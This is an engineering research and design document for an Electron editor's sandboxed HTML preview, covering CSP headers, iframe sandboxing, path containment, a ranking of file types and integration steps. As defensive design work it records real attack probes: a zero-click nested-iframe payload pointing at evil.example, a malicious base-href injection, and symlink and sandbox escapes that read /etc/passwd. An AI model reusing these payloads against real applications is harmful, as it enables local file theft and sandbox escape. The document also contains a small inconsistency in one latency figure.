# Research 39. File preview beyond markdown, starting with HTML

Date: 2026-08-13. Electron 43.3.0, Chromium 150.0.7871.212, Node 24.18.1 in the main
process. Every number below came from running code on this machine. Nothing was
installed into `/Users/gdc/gmux` and nothing under `/Users/gdc/gmux/src` was written.

This document has two halves. Sections 1 to 7 are the decision and the plan, and they
are the part to read. Everything after the appendix marker is the raw evidence from the
four investigations that produced it, kept whole so a later agent can check a claim
without re-running the probes. Where the fourth investigation overturned an earlier one,
sections 1 to 7 carry the later answer and say so.

The file type survey lives beside this one at `docs/research/39-file-preview-part-2.md`.
Its counts are used throughout and are not repeated in full.

---

## 1. The decision

**Render repository HTML inside a sandboxed iframe, served by a new read-only protocol
`gmux-preview:` whose handler sets a strict Content Security Policy header on every
response.** The frame carries the attribute `sandbox=""` with no keywords in it. The
application policy gains exactly one directive, `frame-src gmux-preview:`. No script
from a previewed file ever runs, and no byte from a previewed file ever leaves the
machine.

**Phase 20.5 ships HTML and nothing else.** The mode control reads Preview, Source and
Split, which is the shape the operator asked for and the shape markdown already has.
**Source is the default mode**, for the reason in the next paragraph.

**Zero new runtime dependencies.** Chromium renders the HTML. The one place the bytes
have to be modified is the anchor rewrite in section 2.6, and `parse5` is already in the
tree at 7.3.0 as a transitive dependency of `rehype-raw`, so promoting it to a direct
dependency adds no package to the lock file.

### What the preview can honestly show

It shows a page's text, its structure, its tables, its inline SVG, its local stylesheets,
its local images, its local fonts and its links to other files inside the same project.
A generated coverage report, an API reference page and a static documentation site all
render correctly, with their own colours, in their own renderer process.

### What it cannot show, stated as a number before anyone builds it

Part 2 stripped the scripts, styles and head content from all 1,052 HTML files tracked in
233 repositories on this machine and measured the static text that survived.

| Static text remaining | Files | Share |
| --- | --- | --- |
| Under 40 characters, so effectively blank | 379 | 36% |
| 40 to 400 characters, so a heading and little else | 281 | 27% |
| Over 400 characters, so a readable document | 392 | 37% |

**A script free preview renders blank or nearly blank for 63% of the HTML in these
repositories.** That is the ceiling, and it is not follow-up work. It is what the design
costs. Two things follow, and both are cheap.

- Source is the correct default mode for an HTML tab. Somebody opening `base.html` in a
  templates directory wants the template. Somebody opening a fetched mockup wants the
  page. Only the second reader is served by defaulting to Preview and the first is
  actively harmed.
- The empty pane needs plain copy saying the page builds itself with JavaScript, which
  does not run here. That message will be shown often.

Two supporting counts from the same scan. 884 of the 1,052 files contain a `<script>`
element, which is 84%. 535 of them reference an external `http` or `https` URL, which is
51%, and every one of those is a request a network enabled preview would make and this
one will not.

### Which file types land in the first phase

One. HTML. The full ranking with the evidence is section 3. The short version is that SVG
is already built and already safe, mermaid has more reach than every new file type put
together and deserves its own phase, PDF is close to free but is IDE furniture, and the
rest is below the noise floor. The security work in this phase is one indivisible piece
and all of it exists to serve HTML.

---

## 2. The security design, in full

### 2.1 The problem, stated once

Rendering a repository HTML file means displaying content the user did not write, inside
an Electron application that holds their source code, their git credentials and their
agent sessions. Phase 18.6 taught Tortie to clone arbitrary repositories, so the HTML in
a project is frequently code the user has never read.

### 2.2 Where the content runs

```
  main process
    protocol.handle('gmux-preview')            one function builds every response
      |  resolve realpath of request and root
      |  refuse if the resolved path is outside the resolved root
      |  refuse if the per-document request budget is spent
      |  rewrite external anchors to inert ones          (HTML responses only)
      v
    Response with Content-Security-Policy: default-src 'none'; ...
      |
      v
  renderer, file:// origin, application CSP applies
    <iframe sandbox="" src="gmux-preview://<project-token>/docs/index.html">
      |
      v
  preview frame, its OWN renderer process, opaque origin
    no preload, no window.gmux, no parent access, no script execution
```

Three locks hold this, and they were measured separately. Each one is listed with what it
actually does, because the common belief about the second one is wrong.

| Lock | What it stops | What it does not stop |
| --- | --- | --- |
| The child response policy, `default-src 'none'` and the rest | Every network request, every script, local and remote | Nothing reaches it if the header is missing |
| The iframe `sandbox` attribute with no keywords | Parent DOM access, cookies, storage, forms, popups, top navigation, `<meta http-equiv="refresh">` | **The network. It never stopped the network** |
| The application policy, `frame-src gmux-preview:` | The frame loading anything other than the preview scheme | Anything inside the child document |

### 2.3 The finding that decides the design

**The iframe `sandbox` attribute is not a network control.** This was tested directly,
because it is the belief most likely to produce a wrong design. A host page was given a
deliberately relaxed policy so that the policy could not be the thing doing the work, then
an untrusted page was mounted in a frame with `sandbox="allow-scripts"`. Eleven of eleven
probes reached a local HTTP server, including a remote script that executed and then made
its own second request. Under Tortie's real policy the identical page in the identical
frame produced zero requests, and the console named the directive that refused each one.

The corollary is a rule to write into a test. `allow-same-origin` must never appear in the
sandbox attribute. With `sandbox="allow-scripts allow-same-origin"` under a relaxed policy
the child took the parent's origin, read `window.parent.gmux` and got back `"object"`,
read `window.parent.document.title`, and read 9,196 bytes of `/etc/passwd`. The `wc -c` of
that file on this machine is 9,196.

`allow-scripts` must never appear either. The refusal of `<meta http-equiv="refresh">` is
bought entirely by its absence, and Chromium says so in the console message.

### 2.4 What happens to the application policy

The policy at `src/renderer/index.html:8` today is:

```
  default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
  img-src 'self' data: gmux-asset:; font-src 'self' data:; worker-src 'self' blob:
```

After the change it is:

```
  default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
  img-src 'self' data: gmux-asset:; font-src 'self' data:; worker-src 'self' blob:;
  frame-src gmux-preview:
  ^^^^^^^^^^^^^^^^^^^^^^^ the whole change
```

**Research 37's guarantee is not weakened.** Say that in those words, because the question
was asked in those words. `frame-src` governs one thing, which is what URLs this document
may put in a frame. It grants no fetch reach, no script source and no image source. Two
agents measured this independently in two separate harnesses, with the byte-identical
policy plus the new directive, and both got the same result.

```
  fetch('http://127.0.0.1:<port>/from-app')  ->  REJECTED: Failed to fetch
  requests logged at the server               ->  0
```

Chromium named `default-src 'self'` as the refusing directive, with the note that
`connect-src` was not set. Research 37 section 8.1 stays true as written.

One detail the phase should know, because it looks like a widening and is the opposite.
`frame-src` is unset today, so it falls back to `default-src 'self'`, which means the
renderer may currently frame its own origin. Setting `frame-src gmux-preview:` removes
that. There are zero `<iframe>` and zero `<webview>` elements in `src/renderer` today, so
nothing loses a capability, and the application ends the phase able to frame one scheme
and not its own files.

**The one place where the guarantee would have been weakened, and which is therefore
cut.** An earlier draft of this design routed external link clicks through a sentinel URL
that the main process would read and hand to `shell.openExternal`. Section 2.6 explains
why that is deleted. The short reason is that `shell.openExternal` runs in the main
process, outside every content policy, and research 37's sentence is that the process
holding the material cannot post and the process that can post has none of the material.
A sentinel carries a string from a previewed file into a main-process network action, so
it is the one thing in this phase that touches that sentence.

### 2.5 The child response policy, and what the handler must enforce

Every response from the handler carries this header. It was measured serving a real
project directory, and it produced zero requests at the sink while local stylesheets,
local images and local fonts all applied.

```
  default-src 'none';
  img-src     gmux-preview: data:;
  style-src   gmux-preview: 'unsafe-inline';
  font-src    gmux-preview: data:;
  media-src   gmux-preview:;
  frame-src   gmux-preview:;
  form-action 'none';
  base-uri    'none'
```

`base-uri 'none'` is not decoration. Without it, one `<base href="https://evil/">` in the
file rewrites every relative reference on the page to a remote host.

**The header is a single point of failure, and the failure has two sizes.** Both were
measured at a local HTTP sink.

| Sandbox attribute | Child CSP header | Requests that left | What left |
| --- | --- | --- | --- |
| `sandbox=""` | present | 0 | nothing |
| absent | present | 0 | nothing |
| `sandbox=""` | **absent** | 2 | a remote image and a remote stylesheet |
| absent | **absent** | 4 | those two, plus `fetch()` and `navigator.sendBeacon` |

So there must be exactly one function that constructs a preview response, the header must
be set inside it, and no other code path may build a `Response` for this scheme. The test
that catches a regression here is not a unit test on the header string, because that test
still passes when somebody adds a second response path. The test is the one that counts
requests at a local sink.

Five further requirements on the handler, each with the measurement behind it.

**Containment must use `realpath` on both sides.** A prefix check over joined paths is not
enough. A project root containing `docs/notes.html` as a symlink to `/etc/passwd` served
the real `/etc/passwd`, and the first 30 bytes were confirmed. Git stores symlinks, so
`git clone` creates them. Two details that will otherwise be found by a user. The root has
to be resolved as well as the file, because `/tmp` is a symlink to `/private/tmp` on macOS
and resolving only one side refuses a legitimate file. And `realpath` does not normalise
letter case, so `PROJ/docs/index.html` comes back spelled `PROJ` and a compare against
`proj` returns false. Both of those fail closed, so they are bugs rather than holes, and
they will be reported as "the preview shows nothing".

**The host segment names the project, not `local`.** Tortie holds several project tabs in
one window, which is one of the reasons the product exists, so a single root cannot be
implied. Use `gmux-preview://<opaque-token>/<path relative to that root>`, with main
holding the map from token to root, made when the tab opens. Relative requests keep the
host segment and the URL parser clamps `..` at the host, so a page cannot reach another
project's token. This also gives each project its own origin, which removes a shared
`localStorage` between projects. That storage is writable inside the frame, nothing
sensitive is in it, and no attack was built from it, but it is a shared surface that does
not need to exist.

**Path traversal above the root is already impossible by URL semantics, and the check is
still required.** A page asking for `../../../../../../etc/passwd` had it clamped to
`gmux-preview://<token>/etc/passwd` by the parser, which the handler then resolved inside
the project. That is the parser doing the work and not the handler, and symlinks still
escape it, which is what the `realpath` requirement above is for.

**A per-document request budget.** A scriptless page with 8,000 one-pixel images produced
8,001 handler invocations, 63 ms of main process CPU inside the handler and a 106 ms gap
in a 10 ms main process timer. That is a delay and not a freeze, and a page can hold more
references than 8,000. Refuse past a budget and add the refusal to the count line under
the frame. It turns an unbounded number into a bounded one. Note that the measured
handler used `readFileSync`, and a real handler that streams and resolves symlinks will
cost more per request rather than less.

**The served extension policy is the handler's own, and it is not the image allowlist.**
`src/main/assets/protocol.ts` holds `IMAGE_EXTENSIONS`, and that set also decides what
opens in the image viewer, so it must not grow. The preview handler needs its own set,
which is HTML, CSS, images, fonts and media, with the reason written down next to it.
Copy the existing handler's pattern of resolving symlinks and rechecking the extension
afterwards, and copy its test, rather than writing a fresh one.

### 2.6 External links are inert, and the sentinel is cut

A relative link inside the project works and is pleasant. Clicking `<a href="other.html">`
navigates the frame to the sibling page, so a generated documentation site is browsable
inside the preview. That costs nothing and it is kept.

An external link cannot navigate the frame, because the application's `frame-src` refuses
the URL before `will-frame-navigate` fires. The measured result of doing nothing about it
is a blank preview, with `document.body.innerText` empty.

An earlier draft fixed that by rewriting external anchors to
`gmux-preview://<token>/__external?u=<encoded>`, so that the navigation event would fire
and main could call `shell.openExternal`. **That is cut.** One line in a previewed file,
with no script and no click, fired the event on load:

```html
  <iframe width=1 height=1 src="/__external?u=https%3A%2F%2Fevil.example%2Fzero-click"></iframe>
```

The event carried that exact URL. Substituting `file:///Applications/Calculator.app`
produced the same event with the scheme intact, so the scheme is the page author's choice
as well as the address. The same attack works from inside a `srcdoc` frame. The
measurement stopped at the event and `shell.openExternal` was never called, on purpose, so
what is proven is that an attacker-chosen URL reaches the handler that the draft specified
as calling it.

**Build inert anchors instead.** Rewrite every `http:` and `https:` `href` to nothing,
keep the visible text, and put the original address in the `title` attribute so hovering
shows where it pointed. Add the count to the line under the frame. That leaves external
links dead in this phase, which is honest and which the phase brief should say.

This rewrite is the only place the handler modifies the bytes it serves. It must be a real
HTML parse and not a regular expression, because an `href` inside a comment or inside
another attribute's value will fool a pattern. `parse5` 7.3.0 is already installed under
`rehype-raw`, so the parse, the attribute rewrite and the serialise cost no new package.
Promote `parse5` to a direct dependency at 7.3.0 rather than importing a transitive by
accident. The registry's current version is 8.0.1, and pinning to what is already resolved
keeps the lock file at 643 packages.

If external links are wanted in a later phase, the route to test is the popup route rather
than navigation. An anchor with `target="_blank"` reached the existing
`setWindowOpenHandler` at `src/main/index.ts:321` with the true URL from an unsandboxed
frame, and that handler already filters on `http(s)` and already denies everything else.
That route is **untested under a sandbox** and is not a plan yet.

### 2.7 The attacks that failed, so a verifier does not repeat them

| Attack | Result |
| --- | --- |
| Read the bridge from inside the frame | `typeof window.gmux` was `undefined`, and so were `window.require` and `window.process`. The preload does not run in subframes |
| Read the parent document | Threw `SecurityError`. Chromium named the origin mismatch, not the sandbox |
| Read the disk with `fetch('file:///etc/passwd')` or a local `<img>` | Refused, "Not allowed to load local resource" |
| Run the page's own local script | Blocked against `default-src 'none'`. A local script is untrusted in the same way a remote one is |
| `@import url(http://...)` inside a local stylesheet | Never left. `style-src` names the scheme and no host |
| `<meta http-equiv="refresh">` to a remote host | Refused, because `allow-scripts` is absent |
| Freeze the window with a scriptless page | Failed. 126,006 elements and a 3,006,265 byte document gave a largest host frame gap of 35 ms and zero frames over 100 ms across 1,077 samples |

Two corrections to earlier drafts, both measured, both worth knowing because they change
the case for the design without changing the design.

- Process isolation is not a reason to prefer the scheme over a `srcdoc` frame. Both get
  their own renderer process, measured at host pid 81965, srcdoc frame pid 81979 and
  scheme frame pid 81980. An opaque origin is enough for Chromium to isolate a frame.
- A `srcdoc` frame does not lose local images or inline styles. A `gmux-asset:` image
  loaded inside a frame carrying `sandbox=""`, inline `<style>` blocks applied and `style`
  attributes applied. The real advantages of the scheme are relative resolution without
  rewriting, external stylesheet files loading natively, and links between project pages
  working. Those three are why it wins, and not the two things an earlier table claimed.

### 2.8 Why not the other four options

| Option | Why not |
| --- | --- |
| `srcdoc` iframe with the string built in the renderer | It works and it is safe, and it needs DOMPurify, a URL rewrite pass, stylesheet inlining and an injected `<base href="about:srcdoc">`. Without the base, a fragment link navigates the frame to the application's own `index.html`, and only the sandbox stopped Tortie booting inside its own preview pane. With the base, every non-fragment link sends the frame to `about:blank#blocked` and the pane is destroyed. The scheme has none of this |
| `WebContentsView` with its own session | As safe and no safer, measured. It is not in the React tree, so its bounds have to be pushed from main on every panel resize, split drag, tab switch and scroll, and it composites above the window's own page where Tortie has DOM overlays. It also needs navigation guards that the sandbox attribute gives for free. It costs about 85 MB against about 65 MB for the frame |
| Static render through `rehype-sanitize` | Measured on a real coverage report. The `<title>` text and the contents of `<style>` came out as body text, and the inline SVG badge was reduced to the string "92%". Allowing `style` through to fix the appearance puts a repository's `body{background:#111}` and its `position:fixed` rules into Tortie's own document. `src/renderer/editor/markdown/pipeline.ts` already refuses `style` for that reason |
| `<webview>` | Rejected without testing. Electron discourages it and it adds nothing over the frame |

---

## 3. The file types, ranked

Counts are from `git ls-files` in 233 git repositories under `/Users/gdc`, holding
161,368 tracked files. Using the git index rather than a directory walk excludes
`node_modules` and build output by construction. The repository count is the better signal
of the two, because a type concentrated in one vendored clone is not a type the operator
opens.

| Rank | Type | Files | Repos of 233 | Cost | Verdict |
| --- | --- | --- | --- | --- | --- |
| 1 | **HTML** | 1,052 | not counted separately | 0 packages, 1 CSP directive, 1 new protocol handler | **Ships in Phase 20.5** |
| built | SVG | 1,548 | 102 | already built | Nothing to do. `EditorPanel.tsx:205` already gives it Preview, Source and Split |
| built | Markdown and MDX | 25,676 | 229 | already built | Nothing to do |
| 2 | Mermaid inside markdown | 289 blocks in 132 files | 41 | 107 transitive packages, 0.90 MB gzipped | **Its own phase.** Highest reach of anything unbuilt |
| 3 | PDF | 82 | 17 | 0 packages, 2 CSP tokens | Deferred to a later small phase |
| 4 | CSV and TSV | 101 | 17 | 0 packages, plus row virtualisation | Deferred, written down |
| 5 | Quarto `.qmd` | 179 | 7 | one word in `MARKDOWN_EXTENSIONS` | Deferred. Fidelity is partial |
| Cut | Jupyter notebooks | 12, of which 7 unique by checksum | 8 | about 900 lines | Do not build |
| Cut | JSON | 8,553 | 198 | n/a | Monaco already folds, highlights and validates it |
| Cut | YAML | 2,766 | 117 | n/a | The indentation is the structure, so the text view is the tree view |
| Cut | Log files | 159 | 11 | n/a | Concentrated in two repositories. Search already finds lines across them |
| Cut | Lock files | 127 | 55 | n/a | Wide reach, no reading value. The question is "which version of X" and search answers it |
| Cut | Excalidraw and draw.io | 0 | 0 | n/a | There is nothing in the corpus to render |
| Cut | Office documents, RST, AsciiDoc | 5, 17 and 1 | 2, 4 and 1 | n/a | Below the noise floor, and each needs a large parser |

### The three rankings that need their reasons stated

**SVG is already built, and the brief was wrong to expect it.** `EditorPanel.tsx:205`
gives `tab.markdown || tab.svg` the three-way control, with a comment saying an SVG takes
markdown's control unchanged. It is safe because `src/renderer/editor/image/source.ts`
routes the markup through `<img src="data:image/svg+xml,...">`, and script does not run in
that mode. A file carrying a `<script>` element, an `onerror` handler and a `javascript:`
href was loaded through that exact path. The picture drew at its full 160 pixel width and
nothing fired. Separately, zero of the 1,548 SVG files in the corpus contain a script
element or an inline event handler.

**Mermaid has more reach than every new file type combined, and it is not this phase.**
It reaches 41 repositories against PDF's 17, and three files in Tortie's own `docs/`
render their diagrams as raw text today, because `rg -il mermaid src/ package.json`
returns nothing. It is MIT at 11.16.1, published 2026-08-04, and it needs no `eval`. The
reason to give it its own phase is what it does to the markdown preview rather than what
it costs. It brings 107 transitive packages onto a lock file that holds 643, it brings a
second markdown parser in `marked`, and it brings its own vendored copy of DOMPurify at a
version we do not choose. Its output then has to get past `rehype-sanitize` in
`src/renderer/editor/markdown/pipeline.ts`, which was measured reducing an inline SVG to
its text. Making a hole in that schema is a change to the security posture of the feature
the operator uses most. Part 2's mermaid run is also weaker evidence than it looks,
because its test page carried no CSP meta tag and rendered through an inline
`<script type="module">`, which `script-src 'self'` forbids. The 14 ms to 40 ms timings
and the stripped injection are worth having. The claim "mermaid works under our policy" is
not established by that run.

**PDF is nearly free and is still not first.** Chromium's own PDF viewer extension is
present in Electron 43.3.0 and activates with `webPreferences.plugins` at its default of
`false`, for both direct navigation and an `<embed>`. A 4.3 MB, 22 page file from the
corpus rendered fully under the byte-identical policy with zero violations. The change it
needs is `frame-src` gaining `gmux-asset:` and `object-src` gaining it too, because the
viewer loads the document into an internal frame and `object-src` alone was measured as
not enough. The `blob:` route is worse and needs `connect-src gmux-asset:`, which is the
directive research 37 leans on. The reason PDF is deferred rather than bundled in is the
scope guardrail. A PDF viewer is IDE furniture, it does not serve the agentic coding
workflow, and its 82 files sit in 17 repositories. If it ships later, it ships as
`<embed>` and two tokens, and the phase brief has to say that Chromium's toolbar cannot be
themed and has a download button.

### What must never get a preview

The rule is that preview eligibility is granted by an extension allowlist and is never
inferred from content. These files are tracked in git, in repositories on this machine.

| Pattern | Files tracked |
| --- | --- |
| `.env.*` | 79 |
| `.env` | 10 |
| `.key` | 8 |
| `id_rsa` | 8 |
| `.pem` | 6 |
| `.cer` | 2 |
| `.keystore` | 1 |

There are eight files named `id_rsa` committed to repositories on this machine. The reason
to refuse them is not that rendering is technically dangerous. It is that a preview changes
what is displayed by default, in the direction of being easier to read at a glance. A
`.env` file rendered as a two column table of names and values is a neat screenshot of
someone's credentials, produced by the act of clicking a file. Monospace text in an editor
is the correct presentation for a secret, because reading it takes deliberate effort.

Three rules follow.

- Never add a table view for `.env`, `.properties`, `.netrc`, `.htpasswd` or any file whose
  name matches a credential pattern, even though the key equals value shape parses as
  easily as a CSV does.
- Never let content sniffing grant a preview. A `.pem` is base64 text and a private key can
  be valid JSON, so a key in JSON Web Key form would get a pretty tree view.
- Never preview a file the user has not opened. Any renderer added here runs when a tab is
  opened, never during indexing, never on hover in the tree and never inside search
  results.

One more, because of a feature Tortie already has. Sessions are captured through SpecStory,
so a rendered view of a file is a candidate for appearing in a capture in a way the raw
file is not. That is a second reason the allowlist stays short and the secret patterns are
excluded explicitly rather than by omission.

---

## 4. The libraries

Every row was verified against `registry.npmjs.org` on 2026-08-13 by fetching the version,
the licence and the publish date. Nothing here is recalled.

| Package | Version | Licence | Last publish | Deps | Size | Verdict for Phase 20.5 |
| --- | --- | --- | --- | --- | --- | --- |
| **parse5** | 7.3.0 installed, 8.0.1 published | MIT | 2026-04-19 | 0 | already in the tree | **Promote to a direct dependency at 7.3.0.** Zero packages added. It does the anchor rewrite |
| dompurify | 3.4.13 | MPL-2.0 or Apache-2.0 | 2026-08-03 | 0 | 10,922 B gzip | **Not needed.** It is only needed by the `srcdoc` route, and the response header does its job on the chosen route |
| pdfjs-dist | 6.2.108 | Apache-2.0 | 2026-07-28 | 0 | 502 KB gzip of JS plus 2.9 MB of assets | **Reject.** A wasm blob and 2.9 MB of cmaps and fonts inside a signed and notarized application, to replace a viewer Chromium already ships |
| papaparse | 5.5.4 | MIT | 2026-06-19 | 0 | 7,067 B gzip | Reject. A 40 line RFC 4180 reader matched it exactly on 60,001 rows of a 4,723,838 byte file, 38 ms against 24 ms. It also fails to bundle from `papaparse.js`, because line 931 calls `require('stream')` |
| csv-parse | 7.0.2 | MIT | 2026-08-02 | 0 | 1.6 MB unpacked | Reject, same reason |
| sanitize-html | 2.17.6 | MIT | 2026-07-10 | 7 | not measured | Reject. Seven dependencies including postcss, and it is shaped for Node |
| anser | 2.3.5 | MIT | 2025-12-15 | 0 | 4,470 B gzip | Reject with notebooks. It is the right library for ANSI in cell output and there are 7 unique notebooks to render |
| notebookjs | 0.8.3 | MIT | 2024-08-18 | 4, including jsdom | 28 KB unpacked | Reject. jsdom in a renderer bundle, and two years without a release |
| @signcl/react-ipynb-renderer | 2.2.8 | Apache-2.0 | 2025-08-11 | 9 | 4.06 MB unpacked | Reject. A second markdown stack and a second syntax highlighter beside our Shiki |
| mermaid | 11.16.1 | MIT | 2026-08-04 | 21 direct, 107 transitive | 948,563 B gzip | Its own phase. See section 3 |
| Platform Sanitizer API | Chromium 150 | n/a | n/a | 0 | 0 | Reject for now. All six entry points exist and it sanitises correctly, and its default allowlist has 121 elements that exclude `img`, `style`, `link`, `form`, `details` and `video`. `Document.parseHTML` turned a real page into unstyled text with no images |

Two notes worth carrying into the phase.

`DOMPurify` is cut on the strength of the routing decision and not on its quality. It is
zero dependency, 17,300 stars, zero open issues, and it publishes about monthly. If a later
phase ever takes the `srcdoc` route for anything, take DOMPurify rather than hand-rolling a
schema.

`pdfjs-dist` would give a themeable viewer, which the built-in one is not. That is the only
argument for it and it does not pay for 3.4 MB.

---

## 5. The integration map

Every path below was read at HEAD. Line numbers move, because a Phase 20 workflow is
editing `src` while this is written, so find each site by its symbol name.

### 5.1 The mode control, which already has the shape the operator asked for

`modeOptions(tab, splitFits)` in `src/renderer/editor/EditorPanel.tsx` builds the segmented
control from the tab's own flags, as a plain array of
`{mode, label, icon, title, disabled}`. The markdown branch is at line 205 today.

```ts
if (tab.markdown || tab.svg) {
```

An HTML tab wants that branch verbatim. Widen the condition to one flag meaning "this file
has a rendered form" rather than adding a third name to the test. The existing `noun`
variable already generalises the tooltip copy. **No new `EditorMode` value is needed.**
`EditorMode` is `'diff' | 'file' | 'preview' | 'split' | 'image'` and HTML is `preview`,
`file` and `split`, which is the whole point of the request.

### 5.2 Which viewer a tab gets

`openFromRequest` in `src/renderer/editor/store.ts` computes the `markdown`, `svg` and
`image` booleans once when the tab is created, and nothing recomputes them. Add `html` the
same way, from a predicate in shared code. The initial mode is a chain in the same file. A
navigation with a line number wins, then a diff request or a commit, then the remembered
mode, then the type defaults.

Two decisions to take at spec time.

- The remembered mode is `localStorage['gmux.markdownMode']` today, written by `setMode`.
  Use **one shared key** for "the last mode chosen on a previewable text file" rather than
  one key per type. That matches what a user means when they set Split once.
- HTML defaults to `file`, not `preview`, for the 63% reason in section 1. That is a
  deliberate difference from markdown and it needs a comment saying why, or a later
  cleanup will "fix" it.

`landsInText(image, svg)` in the same file forces a line-less surface back to `file` mode
for a search hit or a go-to-line request. HTML is text, so it lands in text and this
function needs no change.

### 5.3 Split, which is nine lines and comes free

Split is not a component. It is an arm of the render expression in `EditorPanel.tsx`.

```tsx
) : effectiveMode === 'split' ? (
  <div className="ed-split">
    <div className="ed-split-pane">{monaco}</div>
    <div className="ed-split-pane">{preview}</div>
  </div>
) : (
```

`preview` is a two-way pick between `ImageView` and `MarkdownPreview` just above it. A new
viewer joins that expression and gets Split free, under three rules that both existing
viewers already follow.

- Take the buffer through `useLiveTabText(tab.id, tab.savedContents, live)` in
  `src/renderer/editor/live-text.ts` and through no other route, or Split silently shows
  the file as it was on disk.
- Do not focus the scroller when `live` is true, because in Split the source pane owns the
  keyboard.
- Expect only `effectiveMode`. Split already collapses to Source below 480 px of panel
  width, computed once as `splitFits`.

**Live HTML in Split is the one part of this that is harder than the markdown viewer.**
Replacing the frame's URL reloads the frame, which loses scroll position and flashes.
Debounce the rebuild and restore the scroll offset across it. On the chosen route the
rebuild also means writing the unsaved buffer somewhere the handler can serve it, which is
a design question the spec has to answer rather than discover.

### 5.4 How the file reaches the viewer

The image viewer answers this question two different ways, and the difference is the
template.

An SVG is read as plain text through `window.gmux.fs.readFile`, the same call a `.ts` file
uses, and the markup lands in `tab.savedContents`. That is why SVG gets Source, save with
command S and Split for no extra code. A raster image never touches `fs:readFile`, which
refuses a NUL byte in the first 8,192 bytes, and instead uses `fs:readImage`, which stats
for a 32 MB cap and returns a `gmux-asset://local/<absolute path>` URL so the bytes never
cross IPC.

**HTML is text, so it reuses the SVG path exactly.** The file is read for Source and for
Split through the ordinary text reader, and the same absolute path is handed to the
preview frame as a `gmux-preview:` URL. Copy one more thing from the image viewer, which
is `tab.imageRevision` and the `?v=` cache-buster the URL carries. Without it Chromium
serves a stale document while an agent rewrites the file underneath.

Copy the refusal rule too. An SVG that hits the 5 MB text cap in `src/main/fs/ipc.ts` is
refused rather than rendered, because half a picture looks like a bug. Half an HTML
document is worse, because one unclosed tag swallows the rest of the page. Refuse a
truncated HTML file with the over-cap state.

### 5.5 The states, and the theme

`imageSourceFor` in `src/renderer/editor/image/source.ts` is a pure function returning one
of `loading`, `ready`, `too-large`, `missing` or `error`, unit tested without a DOM, and
its comment says it lives outside the component so the component cannot grow a second
opinion about what "too large" means. The HTML viewer wants the same pure function, the
same five states and the same test, plus a sixth state for "rendered, and nearly nothing
was in it", which is the 63% case.

On the theme, there is one judgement the operator owns. Custom properties from
`src/renderer/styles/tokens.css` do not cross into the frame, so a page with no styling of
its own renders as black text on a white rectangle inside a dark application. There are two
honest choices, which are to inject a small style block with values resolved from the
parent, or to leave the page alone behind a plain surface with a visible border. Leaving it
alone is the more truthful of the two, because recolouring a page misrepresents what the
file says. Whichever is chosen, the frame element itself must carry a token background from
our side, so the moment before the document paints is not white.

### 5.6 The file list

| File | New | What it holds |
| --- | --- | --- |
| `src/shared/preview-types.ts` | new | `isHtmlPath`, the served extension set and the media type map, shaped like `image-types.ts`. Shared so main and the renderer cannot drift |
| `src/main/preview/protocol.ts` | new | `protocol.handle('gmux-preview')`. One response constructor with the header inside it, `realpath` containment on both sides, the token to root map, the request budget |
| `src/main/preview/anchors.ts` | new | The `parse5` parse, the external anchor rewrite, the serialise. Pure over a string |
| `src/main/preview/__tests__/` | new | The `/etc/passwd` symlink fixture, the containment matrix, the header on every response path, the anchor rewrite including an `href` inside a comment |
| `src/renderer/editor/html/HtmlPreview.tsx` | new | The frame, the exact sandbox attribute with a comment saying what breaks if it grows, the states, the live buffer subscription, the debounce, the scroll restore, the refusal count line |
| `src/renderer/editor/html/html.css` | new | Colocated, tokens only |
| `src/renderer/editor/html/index.ts` | new | Barrel, two exports, like `markdown/index.ts` |
| `src/renderer/editor/EditorPanel.tsx` | edit | The mode branch widens, the `preview` expression gains a third arm |
| `src/renderer/editor/store.ts` | edit | The `html` flag, the initial mode chain with `file` as the HTML default, the shared last-mode key |
| `src/renderer/index.html` | edit | One directive on line 8 |
| `src/main/index.ts` | edit | Register the scheme as privileged before `app.ready`, and the `will-frame-navigate` guard that refuses everything |
| `package.json` | edit | `parse5` moves from transitive to direct at 7.3.0 |

There is no `sanitize.ts` and no lazy chunk loader in that list, because there is no
library to defer. The renderer side of this feature is a frame element and a state
machine.

---

## 6. The Phase 20.5 backlog entry

Paste the block below into `docs/BACKLOG.md`, and change the queue row for 20.5 from
`RESEARCH RUNNING, R39` to `SPECCED BELOW`.

```markdown
## Phase 20.5. HTML preview, in a frame that cannot reach anything (2026-08-13)

Source: docs/research/39-file-preview.md sections 1 to 5, and
docs/research/39-file-preview-part-2.md for the corpus counts. Read section 2 before
writing any code. Four agents measured this and the fourth overturned part of the first.

**What it does.** An `.html` tab gets the same three-way control markdown has, which is
Preview, Source and Split. Preview renders the file in a sandboxed iframe served by a new
read-only protocol `gmux-preview:`, so the page's own local stylesheets, local images,
local fonts and links to sibling pages all work, and none of its script runs.

**The root cause this is not.** Nothing is broken today. This is a feature the operator
asked for, and the reason it needs a whole phase is that rendering repository HTML means
displaying content the user did not write inside the application that holds their source,
their credentials and their sessions. Phase 18.6 taught Tortie to clone arbitrary
repositories.

### The security constraint, stated as requirements
Each line is a requirement and not a preference. Each was measured. The measurement is in
research 39 section 2.

1. The frame attribute is exactly `sandbox=""`. **`allow-scripts` and `allow-same-origin`
   must never appear.** A test asserts the literal string. With `allow-same-origin` a probe
   read `window.parent.gmux` and 9,196 bytes of `/etc/passwd`. Without `allow-scripts` a
   `<meta http-equiv="refresh">` is refused, and that refusal is load bearing.
2. The application policy gains **exactly one directive**, `frame-src gmux-preview:`.
   Research 37 section 8.1 must still hold, and the proof is a `fetch()` from the app
   renderer to a live local sink returning `REJECTED: Failed to fetch` with 0 requests
   logged.
3. **Exactly one function constructs a preview response**, and the CSP header is set inside
   it. With the header absent, 2 requests left under `sandbox=""` and 4 with no sandbox.
   The regression test counts requests at a local HTTP sink, because a unit test on the
   header string still passes when somebody adds a second response path.
4. Containment calls **`realpath` on both the request and the root**. A naive prefix check
   served the real `/etc/passwd` through a symlink named `docs/notes.html`. The symlink is
   a fixture.
5. The scheme's host segment is a **per-project opaque token**, not `local`. Tortie holds
   several projects in one window, and this also stops two projects sharing a
   `localStorage` origin.
6. **External links are inert.** Rewrite `http(s)` hrefs to nothing, keep the text, put the
   address in `title`. **Do not build a sentinel URL that main turns into
   `shell.openExternal`.** A 1x1 nested iframe fired `will-frame-navigate` with an
   attacker-chosen URL on load, with no script and no click, and the `u` parameter carried
   `file:` as happily as `https:`.
7. The anchor rewrite uses a **real HTML parse**, `parse5` 7.3.0, promoted from transitive
   to direct. A regular expression is fooled by an `href` inside a comment.
8. A **per-document request budget** in the handler. 8,000 images in one page cost the main
   process 96 ms of added timer latency.
